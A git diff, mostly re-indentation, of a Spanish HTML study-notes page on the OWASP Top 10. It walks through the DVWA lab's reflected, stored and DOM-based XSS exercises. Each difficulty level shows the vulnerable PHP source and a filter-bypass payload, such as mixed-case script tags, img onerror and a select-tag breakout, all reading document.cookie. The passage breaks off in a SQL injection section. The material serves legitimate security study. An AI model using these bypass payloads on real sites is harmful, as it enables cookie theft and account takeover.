@@ -1,100 +1,100 @@
 <!DOCTYPE html>
 <html lang="es">
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Apuntes de Wifi</title>
-        <link rel="icon" type="image/png" href="../img/pezEjecutivo.png" />
-        <link rel="stylesheet" href="./styles.css" />
-    </head>
 
-    <body>
-        <!-- Contenedor principal -->
-        <div class="page-container">
-            <!-- Cabecera -->
-            <header>
-                <!-- Botón para volver al índice principal -->
-                <a href="../index.html" class="back-button">← Volver al índice</a>
-                <a href="../index.html"
-                    ><img src="../img/pezEjecutivo.png" alt="Pez Ejecutivo" class="header-image left-image"
-                /></a>
-                <h1>OWASP TOP 10</h1>
-                <p>Apuntes creados por Pablo Valladares González.</p>
-                <button id="theme-toggle">🌙</button>
-            </header>
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Apuntes de Wifi</title>
+    <link rel="icon" type="image/png" href="../img/pezEjecutivo.png" />
+    <link rel="stylesheet" href="./styles.css" />
+</head>
 
-            <!-- Contenido principal -->
-            <main class="container">
-                <!-- Sección de apuntes -->
-                <section class="notes-section">
-                    <div class="note-card">
+<body>
+    <!-- Contenedor principal -->
+    <div class="page-container">
+        <!-- Cabecera -->
+        <header>
+            <!-- Botón para volver al índice principal -->
+            <a href="../index.html" class="back-button">← Volver al índice</a>
+            <a href="../index.html"><img src="../img/pezEjecutivo.png" alt="Pez Ejecutivo"
+                    class="header-image left-image" /></a>
+            <h1>OWASP TOP 10</h1>
+            <p>Apuntes creados por Pablo Valladares González.</p>
+            <button id="theme-toggle">🌙</button>
+        </header>
+
+        <!-- Contenido principal -->
+        <main class="container">
+            <!-- Sección de apuntes -->
+            <section class="notes-section">
+                <div class="note-card">
+                    <p>
+                        <b>OWASP TOP 10</b> es una lista de las diez vulnerabilidades de seguridad más críticas en
+                        aplicaciones web, publicada por el <b>Proyecto Abierto de Seguridad en Aplicaciones Web</b>
+                        (OWASP, por sus siglas en inglés). Esta lista se actualiza periódicamente y tiene como
+                        objetivo concienciar a desarrolladores, arquitectos y organizaciones sobre los riesgos de
+                        seguridad más comunes, así como proporcionar recomendaciones para mitigarlos. Las
+                        vulnerabilidades incluyen problemas como la inyección de código, la autenticación rota y la
+                        exposición de datos sensibles, entre otros.
+                        <br /><br />
+                        <b>Todas las actividades/ejercicios realizados</b> en los siguientes apartados son de la
+                        maquina virtual <b>DVWA</b>
+                    </p>
+                </div>
+
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyección XSS - Conceptos.</h3>
+                    </div>
+                    <div class="card-content">
                         <p>
-                            <b>OWASP TOP 10</b> es una lista de las diez vulnerabilidades de seguridad más críticas en
-                            aplicaciones web, publicada por el <b>Proyecto Abierto de Seguridad en Aplicaciones Web</b>
-                            (OWASP, por sus siglas en inglés). Esta lista se actualiza periódicamente y tiene como
-                            objetivo concienciar a desarrolladores, arquitectos y organizaciones sobre los riesgos de
-                            seguridad más comunes, así como proporcionar recomendaciones para mitigarlos. Las
-                            vulnerabilidades incluyen problemas como la inyección de código, la autenticación rota y la
-                            exposición de datos sensibles, entre otros.
-                            <br /><br />
-                            <b>Todas las actividades/ejercicios realizados</b> en los siguientes apartados son de la
-                            maquina virtual <b>DVWA</b>
+                            La inyección XSS (Cross-Site Scripting) es una vulnerabilidad de seguridad en
+                            aplicaciones web que permite a un atacante inyectar scripts maliciosos en páginas web
+                            vistas por otros usuarios. Esto ocurre cuando una aplicación web no valida o escapa
+                            adecuadamente los datos de entrada proporcionados por el usuario, permitiendo que el
+                            código JavaScript o HTML malicioso se ejecute en el navegador de la víctima.
+                        </p>
+                        <p>Existen tres tipos principales de XSS:</p>
+                        <ul>
+                            <li>
+                                <b>XSS Reflejado:</b> El script malicioso se envía como parte de una solicitud (por
+                                ejemplo, a través de un enlace) y se refleja en la respuesta del servidor. Este tipo
+                                de ataque suele requerir que la víctima haga clic en un enlace malicioso.
+                            </li>
+                            <li>
+                                <b>XSS Almacenado:</b> El script malicioso se almacena en el servidor (por ejemplo,
+                                en una base de datos) y se entrega a los usuarios cuando acceden a la página
+                                afectada. Este tipo es más peligroso, ya que puede afectar a múltiples usuarios sin
+                                necesidad de interacción adicional.
+                            </li>
+                            <li>
+                                <b>XSS DOM-based:</b> El ataque se produce cuando el script malicioso se ejecuta en
+                                el navegador del usuario a través de la manipulación del Document Object Model (DOM)
+                                de la página, sin necesidad de interacción con el servidor.
+                            </li>
+                        </ul>
+                        <p>
+                            Las consecuencias de un ataque XSS pueden incluir el robo de cookies de sesión, la
+                            suplantación de identidad, la redirección a sitios maliciosos y la ejecución de acciones
+                            no autorizadas en nombre de la víctima. Para prevenir XSS, es fundamental validar y
+                            escapar adecuadamente todos los datos de entrada y salida en las aplicaciones web.
                         </p>
                     </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyección XSS - Conceptos.</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                La inyección XSS (Cross-Site Scripting) es una vulnerabilidad de seguridad en
-                                aplicaciones web que permite a un atacante inyectar scripts maliciosos en páginas web
-                                vistas por otros usuarios. Esto ocurre cuando una aplicación web no valida o escapa
-                                adecuadamente los datos de entrada proporcionados por el usuario, permitiendo que el
-                                código JavaScript o HTML malicioso se ejecute en el navegador de la víctima.
-                            </p>
-                            <p>Existen tres tipos principales de XSS:</p>
-                            <ul>
-                                <li>
-                                    <b>XSS Reflejado:</b> El script malicioso se envía como parte de una solicitud (por
-                                    ejemplo, a través de un enlace) y se refleja en la respuesta del servidor. Este tipo
-                                    de ataque suele requerir que la víctima haga clic en un enlace malicioso.
-                                </li>
-                                <li>
-                                    <b>XSS Almacenado:</b> El script malicioso se almacena en el servidor (por ejemplo,
-                                    en una base de datos) y se entrega a los usuarios cuando acceden a la página
-                                    afectada. Este tipo es más peligroso, ya que puede afectar a múltiples usuarios sin
-                                    necesidad de interacción adicional.
-                                </li>
-                                <li>
-                                    <b>XSS DOM-based:</b> El ataque se produce cuando el script malicioso se ejecuta en
-                                    el navegador del usuario a través de la manipulación del Document Object Model (DOM)
-                                    de la página, sin necesidad de interacción con el servidor.
-                                </li>
-                            </ul>
-                            <p>
-                                Las consecuencias de un ataque XSS pueden incluir el robo de cookies de sesión, la
-                                suplantación de identidad, la redirección a sitios maliciosos y la ejecución de acciones
-                                no autorizadas en nombre de la víctima. Para prevenir XSS, es fundamental validar y
-                                escapar adecuadamente todos los datos de entrada y salida en las aplicaciones web.
-                            </p>
-                        </div>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyecciones de XSS Reflejado</h3>
                     </div>
-
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyecciones de XSS Reflejado</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
-                                de codigo js como podria ser <b>alert()</b> o
-                                <b>document.cookie.</b>
-                            </p>
-                            <h4>Dificultad baja</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                    <div class="card-content">
+                        <p>
+                            Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
+                            de codigo js como podria ser <b>alert()</b> o
+                            <b>document.cookie.</b>
+                        </p>
+                        <h4>Dificultad baja</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 header(&quot;X-XSS-Protection: 0&quot;);
 
@@ -103,21 +103,20 @@ if (array_key_exists(&quot;name&quot;, $_GET) &amp;&amp; $_GET[&apos;name&apos;]
     // Feedback for end user
     echo &apos;&lt;pre&gt;Hello &apos; . $_GET[ &apos;name&apos; ] . &apos;&lt;/pre&gt;&apos;;
 }
-?&gt;</pre
-                            >
-                            <p>
-                                Como se puede ver en el codigo fuente, no hay ningún tipo de validación en el codigo,
-                                por lo que si introducimos directamente el codigo:
-                                <b>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</b> funcionara.
-                            </p>
-                            <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/reflectedlow.gif" alt="GIF de como resolver la dificultad baja" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad media</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Como se puede ver en el codigo fuente, no hay ningún tipo de validación en el codigo,
+                            por lo que si introducimos directamente el codigo:
+                            <b>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</b> funcionara.
+                        </p>
+                        <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/reflectedlow.gif" alt="GIF de como resolver la dificultad baja" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 header(&quot;X-XSS-Protection: 0&quot;);
 
@@ -129,35 +128,32 @@ if( array_key_exists(&quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos
     // Feedback for end user
     echo &quot;&lt;pre&gt;Hello {&dollar;name}&lt;/pre&gt;&quot;;
 }
-?&gt;</pre
-                            >
-                            <p>
-                                Como se puede ver en el codigo fuente, esta vez tiene una pequeña sanitización la cual
-                                aplica un <b>str_replace() de &lt;/script&gt;</b> a todo la cadena que introducimos, por
-                                lo que si volvemos a utilizar el input anterior esta vez no funcionara. Si vamos a la
-                                documentación de <b>PHP</b> y buscamos por str_replace() podremos ver la siguiente nota:
-                            </p>
-                            <div class="image-card">
-                                <img
-                                    src="../img/nota_str_replace.png"
-                                    alt="Nota de la documentación de PHP sobre str_replace"
-                                />
-                            </div>
-                            <p>
-                                Por lo que teniendo la siguiente información, podemos saber que si ponemos
-                                &lt;/script&gt; pero con alguna letra mayuscula funcionara adecuadamente, ya que a
-                                diferencia de la función
-                                <b>str_replace()</b> html no es <b>case-sensitive</b> por lo que el codigo sera:
-                                <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>
-                            </p>
-                            <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/reflectedmedium.gif" alt="GIF de como resolver la dificultad media" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad alta</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Como se puede ver en el codigo fuente, esta vez tiene una pequeña sanitización la cual
+                            aplica un <b>str_replace() de &lt;/script&gt;</b> a todo la cadena que introducimos, por
+                            lo que si volvemos a utilizar el input anterior esta vez no funcionara. Si vamos a la
+                            documentación de <b>PHP</b> y buscamos por str_replace() podremos ver la siguiente nota:
+                        </p>
+                        <div class="image-card">
+                            <img src="../img/nota_str_replace.png"
+                                alt="Nota de la documentación de PHP sobre str_replace" />
+                        </div>
+                        <p>
+                            Por lo que teniendo la siguiente información, podemos saber que si ponemos
+                            &lt;/script&gt; pero con alguna letra mayuscula funcionara adecuadamente, ya que a
+                            diferencia de la función
+                            <b>str_replace()</b> html no es <b>case-sensitive</b> por lo que el codigo sera:
+                            <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>
+                        </p>
+                        <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/reflectedmedium.gif" alt="GIF de como resolver la dificultad media" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 header(&quot;X-XSS-Protection: 0&quot;);
 
@@ -169,49 +165,46 @@ if( array_key_exists(&quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos
     // Feedback for end user
     echo &quot;&lt;pre&gt;Hello {&dollar;name}&lt;/pre&gt;&quot;;
 }
-?&gt;</pre
-                            >
-                            <p>
-                                Esta vez en el codigo fuente se esta sanitizando mediante una expresión regular, la cual
-                                podemos ver que tiene <b>/i</b> al final, lo cual hace que no sea
-                                <b>case-sensitive</b> por lo que por mucho que intentemos poner
-                                <b>&lt;/script&gt;</b> siempre sera remplazado por lo que no vamos a poder ejecutar
-                                codigo JS utilizando dicha etiqueta. Por suerte para nosotros esta no es la unica manera
-                                de ejecutar codigo JS, ya que el atributo <b>onerror</b> ejecuta codigo JS cuando no
-                                puede cargar un enlace externo
-                            </p>
-                            <div class="image-card">
-                                <img
-                                    src="../img/onerrorEvent.png"
-                                    alt="Muestra de W3school donde se explica el evento onerror"
-                                />
-                            </div>
-                            <p>
-                                Teniendo esta información, podemos ver que onerror no esta siendo sanitizado por lo que
-                                podriamos utilizarlo, usando el siguiente codigo
-                                <b>&lt;img src=x onerror=alert(document.cookie)&gt;</b>
-                            </p>
-                            <pre>&lt;img src=x onerror=alert(document.cookie)&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/reflectedhigh.gif" alt="GIF de como resolver la dificultad alta" />
-                            </div>
-                            <br /><br />
+?&gt;</pre>
+                        <p>
+                            Esta vez en el codigo fuente se esta sanitizando mediante una expresión regular, la cual
+                            podemos ver que tiene <b>/i</b> al final, lo cual hace que no sea
+                            <b>case-sensitive</b> por lo que por mucho que intentemos poner
+                            <b>&lt;/script&gt;</b> siempre sera remplazado por lo que no vamos a poder ejecutar
+                            codigo JS utilizando dicha etiqueta. Por suerte para nosotros esta no es la unica manera
+                            de ejecutar codigo JS, ya que el atributo <b>onerror</b> ejecuta codigo JS cuando no
+                            puede cargar un enlace externo
+                        </p>
+                        <div class="image-card">
+                            <img src="../img/onerrorEvent.png"
+                                alt="Muestra de W3school donde se explica el evento onerror" />
                         </div>
+                        <p>
+                            Teniendo esta información, podemos ver que onerror no esta siendo sanitizado por lo que
+                            podriamos utilizarlo, usando el siguiente codigo
+                            <b>&lt;img src=x onerror=alert(document.cookie)&gt;</b>
+                        </p>
+                        <pre>&lt;img src=x onerror=alert(document.cookie)&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/reflectedhigh.gif" alt="GIF de como resolver la dificultad alta" />
+                        </div>
+                        <br /><br />
                     </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyecciones de XSS Almacenado</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
-                                de codigo js como podria ser <b>alert()</b> o
-                                <b>document.cookie.</b>
-                            </p>
-                            <h4>Dificultad baja</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyecciones de XSS Almacenado</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
+                            de codigo js como podria ser <b>alert()</b> o
+                            <b>document.cookie.</b>
+                        </p>
+                        <h4>Dificultad baja</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -233,23 +226,22 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
     //mysql_close();
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Aunque es más dificil de ver en este codigo debido a que tiene mucho más contenido de
-                                "relleno", no hay sanitización alguna respecto a XSS por lo que podremos introducir el
-                                codigo &lt;script&gt;alert(document.cookie)&lt;/script&gt; donde queramos, por facilidad
-                                lo introduciremos en el campo del mensaje en vez del de nombre, ya que este tiene una
-                                pequeña sanitización pero de momento no es importante.
-                            </p>
-                            <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/storedLow.gif" alt="GIF de como resolver la dificultad baja" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad media</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Aunque es más dificil de ver en este codigo debido a que tiene mucho más contenido de
+                            "relleno", no hay sanitización alguna respecto a XSS por lo que podremos introducir el
+                            codigo &lt;script&gt;alert(document.cookie)&lt;/script&gt; donde queramos, por facilidad
+                            lo introduciremos en el campo del mensaje en vez del de nombre, ya que este tiene una
+                            pequeña sanitización pero de momento no es importante.
+                        </p>
+                        <pre>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/storedLow.gif" alt="GIF de como resolver la dificultad baja" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -273,28 +265,27 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
     //mysql_close();
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Esta vez se puede apreciar que hay una mayor sanitización en el campo de mensaje que en
-                                la de name, por lo que nos centraremos en como hacer la <b>inyección XSS</b> en ese
-                                campo, como pudimos ver en las actividades de <b>XSS Reflejado</b> str_replace es
-                                case-sensitive a diferencia de HTML, por lo que podemos añadir la etiqueta con una
-                                mayusucla y bypasariamos esa sanitización. Si lo intentamos veremos que no podemos
-                                introducir más de 10 caracteres en el campo de nombre, pero debido a como esta validado
-                                dicha cantidad de caracteres podemos modificarlo directamente en la pagina web para
-                                introducir la cantidad de caracteres que queramos. Una vez hemos cambiado la cantidad de
-                                caracteres ahora si podemos introducir el codigo:
-                                <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>.
-                            </p>
-                            <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/sotredMedium.gif" alt="GIF de como resolver la dificultad media" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad alta</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Esta vez se puede apreciar que hay una mayor sanitización en el campo de mensaje que en
+                            la de name, por lo que nos centraremos en como hacer la <b>inyección XSS</b> en ese
+                            campo, como pudimos ver en las actividades de <b>XSS Reflejado</b> str_replace es
+                            case-sensitive a diferencia de HTML, por lo que podemos añadir la etiqueta con una
+                            mayusucla y bypasariamos esa sanitización. Si lo intentamos veremos que no podemos
+                            introducir más de 10 caracteres en el campo de nombre, pero debido a como esta validado
+                            dicha cantidad de caracteres podemos modificarlo directamente en la pagina web para
+                            introducir la cantidad de caracteres que queramos. Una vez hemos cambiado la cantidad de
+                            caracteres ahora si podemos introducir el codigo:
+                            <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>.
+                        </p>
+                        <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/sotredMedium.gif" alt="GIF de como resolver la dificultad media" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 if( isset( $_POST[ 'btnSign' ] ) ) {
@@ -318,57 +309,55 @@ if( isset( $_POST[ 'btnSign' ] ) ) {
     //mysql_close();
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                Al igual que en el ejercicio de <b>XSS Reflejado</b> de dificultad alta, la sanitización
-                                esta hecha con una expresión regular, que en nuestro caso vamos a saltarnosla utilizando
-                                una etiqueta <b>img</b> con el atributo <b>onerror</b>. Como en el ejercicio anterior es
-                                necesario modificar el html para poder introducir más de 10 caracteres. Por lo que
-                                introduciremos: <b>&lt;img src=/ onerror=alert(document.cookie)&gt;</b>.
-                            </p>
-                            <pre>&lt;img src=/ onerror=alert(document.cookie)&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/storedHigh.gif" alt="GIF de como resolver la dificultad alta" />
-                            </div>
+?&gt;</pre>
+                        <p>
+                            Al igual que en el ejercicio de <b>XSS Reflejado</b> de dificultad alta, la sanitización
+                            esta hecha con una expresión regular, que en nuestro caso vamos a saltarnosla utilizando
+                            una etiqueta <b>img</b> con el atributo <b>onerror</b>. Como en el ejercicio anterior es
+                            necesario modificar el html para poder introducir más de 10 caracteres. Por lo que
+                            introduciremos: <b>&lt;img src=/ onerror=alert(document.cookie)&gt;</b>.
+                        </p>
+                        <pre>&lt;img src=/ onerror=alert(document.cookie)&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/storedHigh.gif" alt="GIF de como resolver la dificultad alta" />
                         </div>
                     </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyecciones de XSS DOM-based</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
-                                de codigo js como podria ser <b>alert()</b> o
-                                <b>document.cookie.</b>
-                            </p>
-                            <h4>Dificultad baja</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+                <div class="expandable-card">
+                    <div class="card-header" onclick="toggleCard(this)">
+                        <h3>Inyecciones de XSS DOM-based</h3>
+                    </div>
+                    <div class="card-content">
+                        <p>
+                            Para dar como superado el ejercicio deberemos de haber sido capaz de ejecutar algún tipo
+                            de codigo js como podria ser <b>alert()</b> o
+                            <b>document.cookie.</b>
+                        </p>
+                        <h4>Dificultad baja</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 # No protections, anything goes
 
-?&gt;</pre
-                            >
-                            <p>
-                                Tal y como pone en el codigo, no hay ningún tipo de proteción pero a diferencia de los
-                                otros dos tipos de ataque, esta vez no tenemos un <b>"formulario"</b> por el cual
-                                introducir datos. Si modificamos el select, veremos que esto cambia en la URL por lo que
-                                podemos realizar la <b>inyección XSS</b> mediante la URL, al no tener ningún tipo de
-                                sanitización podremos introducir directamente el codigo:
-                                <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>
-                            </p>
-                            <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/domLow.gif" alt="GIF de como resolver la dificultad baja" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad media</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            Tal y como pone en el codigo, no hay ningún tipo de proteción pero a diferencia de los
+                            otros dos tipos de ataque, esta vez no tenemos un <b>"formulario"</b> por el cual
+                            introducir datos. Si modificamos el select, veremos que esto cambia en la URL por lo que
+                            podemos realizar la <b>inyección XSS</b> mediante la URL, al no tener ningún tipo de
+                            sanitización podremos introducir directamente el codigo:
+                            <b>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</b>
+                        </p>
+                        <pre>&lt;Script&gt;alert(document.cookie)&lt;/Script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/domLow.gif" alt="GIF de como resolver la dificultad baja" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad media</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 // Is there any input?
@@ -382,41 +371,40 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
     }
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                En este caso podemos ver que no se permite utilizar la etiqueta script, si miramos en la
-                                documentación de <b>PHP</b> sobre la función <b>stripos</b> podremos ver que esta no es
-                                case-sensitive, por lo que nuestro truco realizado en los anteriores ejercicio de poner
-                                la S en mayuscula no funcionara.
-                            </p>
-                            <div class="image-card">
-                                <img src="../img/stripos.png" alt="Imagen de la documentaciónde PHP" />
-                            </div>
-                            <p>
-                                Tal y como vimos en los anteriores ejercicios, aunque no se nos permite el uso de la
-                                etiqueta <b>&lt;script&gt;</b>, podremos ejecutar codigo JS mediante el uso del atributo
-                                <b>onerror</b> en una etiqueta <b>&lt;img&gt;</b>, pero si lo ponemos dicho codigo en la
-                                URL no funciona, si miramos el codigo fuente podemos observar que se esta escribiendo
-                                correctamente pero todo esta dentro de la etiqueta option, que a su vez esta dentro de
-                                la etiqueta select.
-                            </p>
-                            <div class="image-card">
-                                <img src="../img/formularoDom.png" alt="Imagen del codigo JS de la pagina web" />
-                            </div>
-                            <p>
-                                Para solucionar este problema, lo que deberemos de hacer es cerrar dicha etiqueta select
-                                antes de poner nuestro codigo, dando como resultado el codigo:
-                                <b>&lt;/select&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;</b>
-                            </p>
-                            <pre>&lt;/select&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/domMedium.gif" alt="GIF de como resolver la dificultad media" />
-                            </div>
-                            <br /><br />
-                            <h4>Dificultad alta</h4>
-                            <p>Codigo fuente en php:</p>
-                            <pre>
+?&gt;</pre>
+                        <p>
+                            En este caso podemos ver que no se permite utilizar la etiqueta script, si miramos en la
+                            documentación de <b>PHP</b> sobre la función <b>stripos</b> podremos ver que esta no es
+                            case-sensitive, por lo que nuestro truco realizado en los anteriores ejercicio de poner
+                            la S en mayuscula no funcionara.
+                        </p>
+                        <div class="image-card">
+                            <img src="../img/stripos.png" alt="Imagen de la documentaciónde PHP" />
+                        </div>
+                        <p>
+                            Tal y como vimos en los anteriores ejercicios, aunque no se nos permite el uso de la
+                            etiqueta <b>&lt;script&gt;</b>, podremos ejecutar codigo JS mediante el uso del atributo
+                            <b>onerror</b> en una etiqueta <b>&lt;img&gt;</b>, pero si lo ponemos dicho codigo en la
+                            URL no funciona, si miramos el codigo fuente podemos observar que se esta escribiendo
+                            correctamente pero todo esta dentro de la etiqueta option, que a su vez esta dentro de
+                            la etiqueta select.
+                        </p>
+                        <div class="image-card">
+                            <img src="../img/formularoDom.png" alt="Imagen del codigo JS de la pagina web" />
+                        </div>
+                        <p>
+                            Para solucionar este problema, lo que deberemos de hacer es cerrar dicha etiqueta select
+                            antes de poner nuestro codigo, dando como resultado el codigo:
+                            <b>&lt;/select&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;</b>
+                        </p>
+                        <pre>&lt;/select&gt;&lt;img src=/ onerror=alert(document.cookie)&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/domMedium.gif" alt="GIF de como resolver la dificultad media" />
+                        </div>
+                        <br /><br />
+                        <h4>Dificultad alta</h4>
+                        <p>Codigo fuente en php:</p>
+                        <pre>
 &lt;?php
 
 // Is there any input?
@@ -436,97 +424,96 @@ if ( array_key_exists( "default", $_GET ) && !is_null ($_GET[ 'default' ]) ) {
     }
 }
 
-?&gt;</pre
-                            >
-                            <p>
-                                En este caso vemos que la sanitización anterior ha sido cambiada por otra diferente,
-                                esto nos permitira usar &lt;script&gt; sin la necesidad de utilizar &lt;img src=/
-                                onerror=alert(document.cookie)&gt; por lo que aunque es lo mismo, para mi es más comodo.
-                                Tal y como dice el codigo fuente esta vez esta utilizando una <b>"White list"</b> la
-                                cual en caso de que lo que introduzcamos no estre dentro de ese switch acabara en el
-                                default poniendonos <b>"English"</b>. Teniendo en cuenta que es un parametro de
-                                <b>URL</b> podremos dejar English y añadirle un <b>&</b> con la inyección XSS de la
-                                siguiente manera:
-                                <b>&&lt;/select&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</b>
-                            </p>
-                            <pre>&&lt;/select&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
-                            <div class="image-card">
-                                <img src="../img/domHigh.gif" alt="GIF de como resolver la dificultad alta" />
-                            </div>
+?&gt;</pre>
+                        <p>
+                            En este caso vemos que la sanitización anterior ha sido cambiada por otra diferente,
+                            esto nos permitira usar &lt;script&gt; sin la necesidad de utilizar &lt;img src=/
+                            onerror=alert(document.cookie)&gt; por lo que aunque es lo mismo, para mi es más comodo.
+                            Tal y como dice el codigo fuente esta vez esta utilizando una <b>"White list"</b> la
+                            cual en caso de que lo que introduzcamos no estre dentro de ese switch acabara en el
+                            default poniendonos <b>"English"</b>. Teniendo en cuenta que es un parametro de
+                            <b>URL</b> podremos dejar English y añadirle un <b>&</b> con la inyección XSS de la
+                            siguiente manera:
+                            <b>&&lt;/select&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</b>
+                        </p>
+                        <pre>&&lt;/select&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+                        <div class="image-card">
+                            <img src="../img/domHigh.gif" alt="GIF de como resolver la dificultad alta" />
                         </div>
                     </div>
+                </div>
 
-                    <div class="expandable-card">
-                        <div class="card-header" onclick="toggleCard(this)">
-                            <h3>Inyección SQL - Conceptos.</h3>
-                        </div>
-                        <div class="card-content">
-                            <p>
-                                La inyección SQL (SQL Injection) es una vulnerabilidad de seguridad en aplicaciones web
-                                que permite a un atacante interferir en las consultas que una aplicación realiza a su
-                                base de datos. Esto ocurre cuando una aplicación web no valida o escapa adecuadamente
-                                los datos de entrada proporcionados por el usuario, permitiendo que un atacante ejecute
-                                comandos SQL maliciosos que pueden manipular o acceder a datos sensibles.
-                            </p>
-                            <p>Existen varios tipos de inyección SQL, entre los que se destacan:</p>
-                            <ul>
-                                <li>
-                                    <b>Inyección SQL Clásica:</b> El atacante inserta código SQL malicioso en un campo
-                                    de entrada, como un formulario de inicio de sesión, que se ejecuta en la base de
-                                    datos. Este tipo de ataque puede permitir al atacante obtener acceso no autorizado a
-                                    datos o incluso modificar la base de datos.
-                                </li>
-                                <li>
-                                    <b>Inyección SQL Basada en Tiempo:</b> Este tipo de inyección se utiliza para
-                                    determinar la estructura de la base de datos mediante la introducción de consultas
